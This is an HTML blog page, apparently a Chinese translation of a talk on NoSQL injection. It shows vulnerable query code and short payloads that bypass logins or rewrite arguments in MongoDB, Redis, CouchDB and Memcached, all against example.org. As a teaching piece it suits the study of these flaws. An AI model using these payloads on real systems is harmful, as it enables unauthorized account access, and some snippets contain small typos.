@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="NoSql,MongoDB,Redis,Memcached,CouchDB,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介">
+<meta name="keywords" content="NoSql,MongoDB,Redis,Memcached,CouchDB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NoSql Injection - Patrick Spiegel(翻译)">
+<meta property="og:url" content="https://exexute.github.io/2019/08/13/NoSql-Injection-Patrick-Spiegel/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://exexute.github.io/2019/08/13/NoSql-Injection-Patrick-Spiegel/am_overview.png">
+<meta property="og:updated_time" content="2022-06-24T14:09:00.720Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NoSql Injection - Patrick Spiegel(翻译)">
+<meta name="twitter:description" content="简介">
+<meta name="twitter:image" content="https://exexute.github.io/2019/08/13/NoSql-Injection-Patrick-Spiegel/am_overview.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/08/13/NoSql-Injection-Patrick-Spiegel/">
+
+
+
+
+
+  <title>NoSql Injection - Patrick Spiegel(翻译) | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/08/13/NoSql-Injection-Patrick-Spiegel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">NoSql Injection - Patrick Spiegel(翻译)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-13T10:34:35+08:00">
+                2019-08-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br><a id="more"></a></p>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><blockquote>
+<p>SCOPE</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>数据类型</th>
+<th>排名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mongoDB</td>
+<td>文档存储</td>
+<td>5.</td>
+</tr>
+<tr>
+<td>redis</td>
+<td>键值对存储</td>
+<td>9.</td>
+</tr>
+<tr>
+<td>memcached</td>
+<td>键值对存储</td>
+<td>23.</td>
+</tr>
+<tr>
+<td>CouchDB</td>
+<td>文档存储</td>
+<td>26.</td>
+</tr>
+</tbody>
+</table>
+<p>node，php，python，ruby等通常使用NoSql数据库，为了更好的利用NoSql注入，需要部署对应的环境来进行测试。</p>
+<blockquote>
+<p>攻击模型</p>
+</blockquote>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ol>
+<li>攻击者需要了解目标应用部署的技术栈，包括应用服务器、驱动、框架和数据库；</li>
+<li>攻击者可以在已授权的正常用户中向服务器端发送任意请求；</li>
+</ol>
+<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ol>
+<li>修改查询参数, 使数据库执行额外的查询；</li>
+<li>可以触发意外的CRUD操作；</li>
+</ol>
+<h4 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h4><p><img src="./am_overview.png" alt="am_overview"></p>
+<blockquote>
+<p>NoSql注入 - 攻击者</p>
+</blockquote>
+<ul>
+<li>了解非结构化数据查询语言</li>
+<li>具有多个数据库环境的多样化操作系统</li>
+<li>客户端通过RESTfull接口访问数据库</li>
+</ul>
+<blockquote>
+<p>注入攻击</p>
+</blockquote>
+<h4 id="已知漏洞"><a href="#已知漏洞" class="headerlink" title="已知漏洞"></a>已知漏洞</h4><ul>
+<li>PHP，NodeJs + MongoDB：登陆绕过</li>
+<li>字符串连接依然是json和script参数的问题(读取配置）</li>
+<li>逃避驱动，如:Memcached</li>
+</ul>
+<h4 id="MongoDB-登陆绕过"><a href="#MongoDB-登陆绕过" class="headerlink" title="MongoDB 登陆绕过"></a>MongoDB 登陆绕过</h4><p><strong>nodejs</strong> 登陆绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// NodeJS with Express.js - 后台代码</span><br><span class="line">db.collection(&quot;users&quot;).find(&#123;</span><br><span class="line">    &quot;user&quot;: req.query.user,</span><br><span class="line">    &quot;password&quot;: req.query.password</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>正常登陆链接: <a href="https://example.org/login?user=patrick&amp;password=1234" target="_blank" rel="noopener">https://example.org/login?user=patrick&amp;password=1234</a><br>exp: <a href="https://example.org/login?user=patrick&amp;password[%24ne]=" target="_blank" rel="noopener">https://example.org/login?user=patrick&amp;password[%24ne]=</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// NodeJS with Express.js - 后台代码</span><br><span class="line">db.collection(&quot;users&quot;).find(&#123;</span><br><span class="line">    &quot;user&quot;: &quot;patrick&quot;,</span><br><span class="line">    &quot;password&quot;: &#123;&quot;&amp;ne&quot;: &quot;&quot;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>其他语言类似代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP</span></span><br><span class="line">$collection-&gt;find(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'user'</span> =&gt; $_GET[<span class="string">'user'</span>],</span><br><span class="line">    <span class="string">'password'</span> =&gt; $_get[<span class="string">'password'</span>]</span><br><span class="line">));</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ruby on Rails</span></span><br><span class="line">db[<span class="string">'users'</span>].find(&#123;</span><br><span class="line">    <span class="symbol">:user</span> =&gt; req.params[<span class="string">'user'</span>],</span><br><span class="line">    <span class="symbol">:password</span> =&gt; req.params[<span class="string">'password'</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python with Django</span></span><br><span class="line">db.users.find(&#123;</span><br><span class="line">    <span class="string">"user"</span>: request.GET[<span class="string">'user'</span>],</span><br><span class="line">    <span class="string">"password"</span>: request.GET[<span class="string">'password'</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>post请求注入<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># json data</span></span><br><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: example.org</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">'user'</span>: <span class="string">'patrick'</span>, <span class="string">'password'</span>: &#123;<span class="string">'&amp;gt'</span>: <span class="string">''</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># form data</span></span><br><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: example.org</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">user=Patrick&amp;password[%24ne]=</span><br></pre></td></tr></table></figure></p>
+<h4 id="Redis-参数重写注入"><a href="#Redis-参数重写注入" class="headerlink" title="Redis 参数重写注入"></a>Redis 参数重写注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// NodeJS with Express.js</span><br><span class="line">RedisClient.Exprieat(</span><br><span class="line">    req.query.key,</span><br><span class="line">    new Date(&quot;November 8, 2026 11:13:00&quot;).getTime()</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>通过注入数组重写所有的参数, 只有NodeJS的Redis驱动受影响。payload: …/expire?key[]=foo&amp;key[]=1117542887</p>
+<p><strong>CounchDB</strong> 登陆绕过</p>
+<p>注入selector查询条件绕过登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// NodeJS with Express.js</span><br><span class="line">function checkCredentials(user, password, callback) &#123;</span><br><span class="line">    var options = &#123;&apos;selector&apos;: &#123;&apos;user&apos;: user, &apos;password&apos;: password&#125;&#125;;</span><br><span class="line">    couch.use(&apos;users&apos;).get(&apos;_find&apos;, options, (err, res) =&gt; &#123;</span><br><span class="line">        callback(res.docs.length === 1);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">checkCredentials(req.query.user, req.query.password, handleResult);</span><br></pre></td></tr></table></figure></p>
+<p>payload: login?user=patrick&amp;password[%24ne]=</p>
+<p>使用特殊的文档<code>__all_docs</code>和未定义的password绕过登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// NodeJS with Express.js</span><br><span class="line">function checkUser(user, password, callback) &#123;</span><br><span class="line">    nano.use(&apos;users&apos;).get(user, (err, res) =&gt; &#123;</span><br><span class="line">        callback(res.password === password);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">checkUser(req,query.user, req.query.password, handleResult);</span><br></pre></td></tr></table></figure></p>
+<p>payload: <a href="https://example.org/login?user=_all_docs" target="_blank" rel="noopener">https://example.org/login?user=_all_docs</a></p>
+<h4 id="Memcached-数组注入"><a href="#Memcached-数组注入" class="headerlink" title="Memcached 数组注入"></a>Memcached 数组注入</h4><p>数组注入绕过应用层检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function getCache(key) &#123;</span><br><span class="line">    if (key.indexOf(&apos;auth_&apos;) === 0&#123;</span><br><span class="line">        callback(&quot;Invalid key!&quot;);</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        memcached.get(key, (err, body) =&gt; &#123;</span><br><span class="line">            callback(err || body);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getCache(req.query.key, handleResult);</span><br></pre></td></tr></table></figure></p>
+<p>payload: <a href="https://example.org?/getCache?key[]=auth_patrick" target="_blank" rel="noopener">https://example.org?/getCache?key[]=auth_patrick</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/NoSql/" rel="tag"># NoSql</a>
+          
+            <a href="/tags/MongoDB/" rel="tag"># MongoDB</a>
+          
+            <a href="/tags/Redis/" rel="tag"># Redis</a>
+          
+            <a href="/tags/Memcached/" rel="tag"># Memcached</a>
+          
+            <a href="/tags/CouchDB/" rel="tag"># CouchDB</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/12/HTB-linux-Jarvis/" rel="next" title="HTB linux Jarvis">
+                <i class="fa fa-chevron-left"></i> HTB linux Jarvis
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/22/HTB-windows-Arkman/" rel="prev" title="HTB-windows-Arkman">
+                HTB-windows-Arkman <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文章目录"><span class="nav-number">1.</span> <span class="nav-text">文章目录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#环境"><span class="nav-number">1.0.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#目标"><span class="nav-number">1.0.2.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总览"><span class="nav-number">1.0.3.</span> <span class="nav-text">总览</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#已知漏洞"><span class="nav-number">1.0.4.</span> <span class="nav-text">已知漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MongoDB-登陆绕过"><span class="nav-number">1.0.5.</span> <span class="nav-text">MongoDB 登陆绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Redis-参数重写注入"><span class="nav-number">1.0.6.</span> <span class="nav-text">Redis 参数重写注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Memcached-数组注入"><span class="nav-number">1.0.7.</span> <span class="nav-text">Memcached 数组注入</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
